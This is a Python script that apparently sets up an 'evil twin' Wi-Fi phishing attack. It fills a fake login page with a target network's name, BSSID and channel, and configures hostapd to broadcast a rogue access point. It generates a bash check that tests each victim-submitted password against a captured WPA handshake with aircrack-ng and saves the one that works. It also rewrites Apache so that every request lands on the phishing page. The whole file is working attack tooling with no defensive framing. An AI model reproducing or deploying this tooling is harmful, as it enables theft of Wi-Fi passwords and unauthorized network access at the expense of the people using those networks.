import sys, os
#essid bssid channel
essid=sys.argv[1]
bssid=sys.argv[2]
channel=sys.argv[3]

f=open("data/stock.html","r")
ff=f.read()
f.close()

m=ff.replace("-essid",essid).replace("-bssid",bssid).replace("-channel",channel)

a=open("data/index.html","w")
a.write(m)
a.close()

hostapd='''
interface=wlan0
#driver=nl80211
ssid={}
channel=6
'''.format(essid)

a=open("../hotspot/hostapd.conf","w")
a.write(hostapd)
a.close()

m='''
#!/bin/bash
bssid={}
essid={}
if  aircrack-ng -a 2 -b $bssid -0 -s handshake.cap -w data.txt  | grep "KEY NOT FOUND"; then
echo 2 > status.txt
echo "2\n" > intento
else
echo "1\n" > intento
cp data.txt  ../../$essid-$bssid-pass.txt
echo 1 > status.txt
fi

echo " " > data.txt

	
'''.format(bssid, essid)


h=open("data/handcheck","w")
h.write(m)
h.close()


m='''<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot {}
	ErrorDocument 404 /

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf

</VirtualHost>

<Directory "{}">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
	
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>


# vim: syntax=apache ts=4 sw=4 sts=4 sr noet'''.format(os.getcwd() + "/data")

h=open("/etc/apache2/000-default.conf","w")
h.write(m)
h.close()




